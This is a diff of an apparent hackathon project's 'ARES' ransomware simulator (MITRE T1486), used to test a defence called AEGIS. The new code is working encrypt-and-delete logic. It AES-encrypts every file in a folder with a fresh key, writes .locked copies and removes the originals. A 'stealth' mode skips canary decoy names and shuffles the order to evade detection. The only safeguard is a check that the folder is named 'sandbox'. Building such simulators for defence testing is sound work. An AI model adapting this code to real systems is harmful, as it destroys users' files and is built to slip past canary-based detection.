@@ -1,218 +1,105 @@
 """
-attacker.py — ARES Ransomware Behaviour Simulator
-==================================================
-Team QuadRoot | Problem Statement #24 | MITRE ATT&CK T1486
+attacker.py - ARES Ransomware Behaviour Simulator (MITRE ATT&CK T1486)
+=====================================================================
+Real, sandbox-confined file encryptor used to evaluate the AEGIS defence.
 
-PURPOSE:
-    Simulates a real-world ransomware encryption pipeline that sequentially
-    enumerates, reads, encrypts, and destroys user documents in a sandboxed
-    directory. This script acts as the OFFENSIVE component of the project.
+For every target file it: reads plaintext -> AES-128-CBC encrypts (random
+key + per-file IV) -> writes <name>.locked -> deletes the original.
+It refuses to operate on any directory other than the sandbox folder.
 
-MAPPED TOOL:
-    Atomic Red Team — Industry-standard adversary simulation framework.
-    This script emulates Atomic Red Team test case T1486 (Data Encrypted
-    for Impact) in a safe, isolated sandbox environment.
+Usage:
+    python attacker.py [--delay 0.8] [--profile standard|stealth]
 
-ENCRYPTION METHOD:
-    AES-128 in CBC (Cipher Block Chaining) mode via the Python `cryptography`
-    library. CBC mode XORs each plaintext block with the previous ciphertext
-    block before encryption, ensuring identical plaintext blocks produce
-    different ciphertext outputs (diffusion).
-
-SAFETY:
-    This script ONLY operates on files inside the ./sandbox/ directory.
-    It NEVER touches files outside the sandbox. It is designed exclusively
-    for educational demonstration and hackathon evaluation.
-
-USAGE:
-    Terminal 1:  python defense.py     (start defense daemon FIRST)
-    Terminal 2:  python attacker.py    (then launch this attack)
+Profiles:
+    standard  alphabetical sweep, touches everything (hits canaries early)
+    stealth   skips well-known decoy name prefixes (000_, zzz_) and walks the
+              directory in random order -> must be caught by the behavioural
+              (mass-rename burst) detector instead of the canary trap.
 """
+import argparse
+import os
+import random
+import sys
+import time
 
-import os       # os — Standard library for filesystem operations (listdir, remove, path)
-import time     # time — Used to introduce sleep delays between encryptions for visibility
-import base64   # base64 — Available for encoding operations (imported for extensibility)
-
-# cryptography — Industry-grade cryptographic library wrapping OpenSSL
-# We import specific AES primitives from the hazmat (hazardous materials) subpackage
-# because we need low-level control over the encryption algorithm and mode of operation.
+from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
 
-# ====================================================================
-# CONFIGURATION CONSTANTS
-# ====================================================================
-
-# SANDBOX_DIR: The isolated target directory that the ransomware will sweep.
-# In a real attack, this would be /home/user/Documents or C:\Users\<user>\Documents.
-# We restrict to ./sandbox/ for safety during demonstration.
-SANDBOX_DIR = "./sandbox"
-
-# AES_KEY: 16-byte (128-bit) symmetric encryption key.
-# In real ransomware, this key would be randomly generated per victim and
-# encrypted with the attacker's RSA public key, making decryption impossible
-# without paying the ransom. Here we hardcode it for reproducibility.
-AES_KEY = b"1234567890123456"  # 16 bytes = AES-128
-
-# IV (Initialization Vector): 16-byte random value used in CBC mode.
-# The IV ensures that encrypting the same plaintext twice produces different
-# ciphertext. In real malware, a unique IV is generated per file.
-IV = b"1234567890123456"       # 16 bytes (must match AES block size)
+HERE = os.path.dirname(os.path.abspath(__file__))
+SANDBOX_DIR = os.path.join(HERE, "sandbox")
+KEY_FILE = os.path.join(HERE, ".attacker_key.bin")  # kept OUTSIDE the sandbox
 
 
-def encrypt_data(data):
-    """
-    Encrypts raw bytes using AES-128 in CBC mode with PKCS#7 padding.
-
-    AES operates on fixed 16-byte blocks. If the input data length is not
-    a multiple of 16, we must pad it. PKCS#7 padding appends N bytes, each
-    with the value N, where N = 16 - (data_length % 16).
-
-    Example: If data is 25 bytes long:
-        - 25 % 16 = 9 bytes into the second block
-        - Padding needed: 16 - 9 = 7 bytes
-        - 7 bytes of value 0x07 are appended
-
-    Args:
-        data (bytes): The raw plaintext bytes to encrypt
-
-    Returns:
-        bytes: The AES-128 CBC encrypted ciphertext
-    """
-    # Step 1: Calculate PKCS#7 padding length
-    pad_len = 16 - (len(data) % 16)
-
-    # Step 2: Append padding bytes (each byte has the value of pad_len)
-    padded_data = data + bytes([pad_len] * pad_len)
-
-    # Step 3: Create the AES cipher object with our key and IV
-    # default_backend() selects the system's OpenSSL installation
-    backend = default_backend()
-    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(IV), backend=backend)
-
-    # Step 4: Create an encryptor context and perform the encryption
-    encryptor = cipher.encryptor()
-
-    # Step 5: Feed padded data through the cipher and finalize
-    # .update() processes the main data blocks
-    # .finalize() completes the encryption and flushes internal buffers
-    return encryptor.update(padded_data) + encryptor.finalize()
+def load_key():
+    key = os.urandom(16)  # fresh AES-128 key per run
+    with open(KEY_FILE, "wb") as f:
+        f.write(key)
+    return key
 
 
-def generate_dummy_files():
-    """
-    Seeds the sandbox directory with realistic dummy user documents.
-
-    These files simulate the types of high-value corporate data that
-    real ransomware targets: financial reports, databases, contracts,
-    cryptographic keys, and API credentials.
-
-    This function is idempotent — it only creates files that don't
-    already exist, allowing safe re-runs without data duplication.
-    """
-    # Create sandbox directory if it doesn't exist
-    if not os.path.exists(SANDBOX_DIR):
-        os.makedirs(SANDBOX_DIR)
-
-    # Dictionary mapping filename → simulated file content
-    dummy_files = {
-        "financial_report.xlsx":      "CONFIDENTIAL FINANCIAL AUDIT: $4.2M OPEX REPORT",
-        "customer_database.sql":      "SELECT * FROM corporate_customers WHERE credit_limit > 500000;",
-        "product_roadmap.pdf":        "INTERNAL PRODUCT STRATEGY // AEGIS PLATFORM VERSION 5.0",
-        "intellectual_property.key":  "CERTIFICATE AUTHORITY SYMMETRIC PRIVKEY: 0x82A1B7E3",
-        "api_secrets.env":            "DATABASE_URL=postgresql://db_admin:supersecurepwd@localhost:5432/prod"
-    }
-
-    for name, content in dummy_files.items():
-        path = os.path.join(SANDBOX_DIR, name)
-        if not os.path.exists(path):
-            with open(path, "w") as f:
-                f.write(content)
-            print(f"[ARES] Pre-seeded system file: {path}")
+def encrypt_data(data: bytes, key: bytes) -> bytes:
+    iv = os.urandom(16)
+    padder = padding.PKCS7(128).padder()
+    padded = padder.update(data) + padder.finalize()
+    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
+    return iv + enc.update(padded) + enc.finalize()
 
 
-def run_attack():
-    """
-    Main ransomware execution loop — simulates MITRE ATT&CK T1486.
+def decrypt_data(blob: bytes, key: bytes) -> bytes:
+    iv, ct = blob[:16], blob[16:]
+    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
+    unpadder = padding.PKCS7(128).unpadder()
+    return unpadder.update(dec.update(ct) + dec.finalize()) + unpadder.finalize()
 
-    The attack follows this pipeline for each file:
-        1. ENUMERATE:  os.listdir() + sorted() to scan directory alphabetically
-        2. READ:       open(file, 'rb') reads raw bytes of the target file
-        3. ENCRYPT:    encrypt_data() applies AES-128 CBC cipher
-        4. WRITE:      Ciphertext is written to a new file with .locked extension
-        5. DELETE:     os.remove() destroys the original plaintext file
 
-    The alphabetical sort order is critical to our defense strategy:
-    The canary file is named "000_urgent_salary_audit.xlsx" with a "000_" prefix
-    to ensure it appears near the top of the sorted list, forcing the attacker
-    to encounter it early in its traversal.
+def run_attack(delay: float, profile: str) -> int:
+    target = os.path.abspath(SANDBOX_DIR)
+    if os.path.basename(target) != "sandbox":  # hard safety interlock
+        print("[ARES] refusing to run outside sandbox", flush=True)
+        return 2
+    if not os.path.isdir(target):
+        print("[ARES] sandbox directory missing - start defense.py first", flush=True)
+        return 2
 
-    The 1-second sleep between files allows human observation during demos
-    and gives the defense daemon time to react (simulating real-world
-    detection latencies).
-    """
     print("=" * 60)
-    print("      ATOMIC RED TEAM // T1486 RANSOMWARE SIMULATOR      ")
-    print("=" * 60)
+    print(f" ATOMIC RED TEAM // T1486 RANSOMWARE SIMULATOR  pid={os.getpid()}")
+    print("=" * 60, flush=True)
 
-    # Phase 1: Seed target directory with dummy documents
-    generate_dummy_files()
+    key = load_key()
+    names = [n for n in os.listdir(target)
+             if os.path.isfile(os.path.join(target, n)) and not n.endswith(".locked")]
+    if profile == "stealth":
+        names = [n for n in names if not n.startswith(("000_", "zzz_"))]
+        random.shuffle(names)
+    else:
+        names.sort()
+    print(f"[ARES] T1083 discovery: {len(names)} target files (profile={profile})", flush=True)
 
-    # Phase 2: T1083 — File and Directory Discovery
-    # sorted() ensures alphabetical traversal, which is a common ransomware pattern
-    files = sorted(os.listdir(SANDBOX_DIR))
-    print(f"\n[ARES] Enumeration complete. Found {len(files)} files target files.")
-    print("[ARES] Starting sequential AES-128 encryption pipeline...\n")
-
-    # Phase 3: Sequential encryption loop
-    for filename in files:
-        # Skip files already encrypted in a previous run
-        if filename.endswith(".locked"):
-            continue
-
-        file_path = os.path.join(SANDBOX_DIR, filename)
-
-        # Skip subdirectories (only target files)
-        if not os.path.isfile(file_path):
-            continue
-
-        print(f"[ARES] Target identified: {file_path}")
-
-        # Deliberate delay for demonstration visibility
-        # In real ransomware, there would be NO delay — encryption happens
-        # as fast as the disk I/O allows (thousands of files per second)
-        time.sleep(1.0)
-
+    done = 0
+    for name in names:
+        path = os.path.join(target, name)
+        time.sleep(delay)
         try:
-            # T1005 — Data from Local System: read plaintext bytes
-            with open(file_path, "rb") as f:
-                plaintext = f.read()
+            with open(path, "rb") as f:          # T1005
+                plain = f.read()
+            blob = encrypt_data(plain, key)      # T1486
+            with open(path + ".locked", "wb") as f:
+                f.write(blob)
+            os.remove(path)                      # T1485
+            done += 1
+            print(f"[ARES] encrypted {name} -> {name}.locked", flush=True)
+        except FileNotFoundError:
+            continue
+        except Exception as exc:
+            print(f"[ARES] failed {name}: {exc}", flush=True)
 
-            # T1486 — Data Encrypted for Impact: AES-128 CBC encryption
-            ciphertext = encrypt_data(plaintext)
-
-            # Write encrypted ciphertext with .locked extension
-            # This is the ransomware's "calling card" — victims see .locked files
-            locked_path = file_path + ".locked"
-            with open(locked_path, "wb") as f:
-                f.write(ciphertext)
-
-            # T1485 — Data Destruction: remove original plaintext
-            # Without the AES key, the data is now permanently inaccessible
-            os.remove(file_path)
-
-            print(f"[WARNING] File encrypted: {file_path} -> {locked_path}")
-
-        except Exception as e:
-            # Graceful error handling prevents crash on permission errors
-            print(f"[ERROR] Failed to encrypt file {filename}: {e}")
-
-    print("\n[ARES] Traverse loop complete. Ransom document printed to desktop.")
+    print(f"[ARES] sweep finished: {done} files encrypted", flush=True)
+    return 0
 
 
-# ====================================================================
-# ENTRY POINT
-# ====================================================================
-# When this script is executed directly (not imported), run the attack.
 if __name__ == "__main__":
-    run_attack()
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--delay", type=float, default=0.8)
+    ap.add_argument("--profile", choices=["standard", "stealth"], default="standard")
+    a = ap.parse_args()
+    sys.exit(run_attack(a.delay, a.profile))
